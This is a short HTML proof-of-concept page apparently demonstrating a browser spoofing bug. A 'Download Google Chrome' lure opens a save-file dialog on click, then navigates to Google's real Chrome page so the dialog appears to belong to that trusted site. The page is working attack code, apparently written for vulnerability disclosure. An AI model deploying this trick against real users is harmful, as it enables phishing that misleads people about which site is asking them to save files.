<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PoC</title>
<style>
body {
    margin: 0;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, sans-serif;
}
.cta {
    text-align: center;
}
</style>
</head>
<body>

<div class="cta">
    <h1>Download Google Chrome</h1>
    <p>Click anywhere to continue</p>
</div>

<script>
document.addEventListener('click', async () => {
    if (!('showSaveFilePicker' in window)) return;

    try {
        // Step 1: Open file picker (valid user gesture)
        const pickerPromise = window.showSaveFilePicker({
            suggestedName: 'chrome_download.txt',
            types: [{
                description: 'Text',
                accept: { 'text/plain': ['.txt'] }
            }]
        });

        // Step 2: Delay navigation slightly AFTER picker is shown
        setTimeout(() => {
            window.location.href = 'https://www.google.com/chrome/';
        }, 300);

        // Step 3: Await picker (user still sees dialog)
        await pickerPromise;

    } catch (e) {}
}, { once: true });
</script>

</body>
</html>
